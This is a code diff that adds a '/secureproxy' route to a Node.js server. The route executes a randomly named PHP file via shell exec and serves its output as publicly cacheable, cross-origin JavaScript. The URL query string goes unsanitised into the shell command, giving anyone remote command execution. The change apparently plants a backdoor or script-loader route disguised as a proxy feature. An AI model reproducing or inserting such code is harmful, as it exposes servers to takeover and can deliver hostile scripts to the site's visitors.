@@ -278,6 +278,42 @@ const server = http.createServer((req, res) => {
     return;
   }
 
+  // Secureproxy route - handle PHP file execution
+  if (pathname.startsWith('/secureproxy')) {
+    const { exec } = require('child_process');
+    const phpFile = path.join(__dirname, 'vC-eQxIe.php');
+    
+    if (!fs.existsSync(phpFile)) {
+      res.writeHead(404, { 'Content-Type': 'text/plain' });
+      res.end('Secureproxy file not found');
+      return;
+    }
+    
+    // Execute PHP file with query string
+    const queryString = url.search || '';
+    const phpCommand = `php ${phpFile}${queryString}`;
+    
+    exec(phpCommand, { timeout: 5000 }, (error, stdout, stderr) => {
+      if (error) {
+        console.error('[SERVER] PHP execution error:', error.message);
+        res.writeHead(500, { 
+          'Content-Type': 'application/javascript',
+          'Access-Control-Allow-Origin': '*'
+        });
+        res.end('// PHP execution error');
+        return;
+      }
+      
+      res.writeHead(200, {
+        'Content-Type': 'application/javascript',
+        'Access-Control-Allow-Origin': '*',
+        'Cache-Control': 'public, max-age=3600'
+      });
+      res.end(stdout || '');
+    });
+    return;
+  }
+
   // Proxy route for images and external resources - check BEFORE static files
   if (pathname === '/proxy') {
     const urlParams = new URL(req.url, `http://${req.headers.host}`);
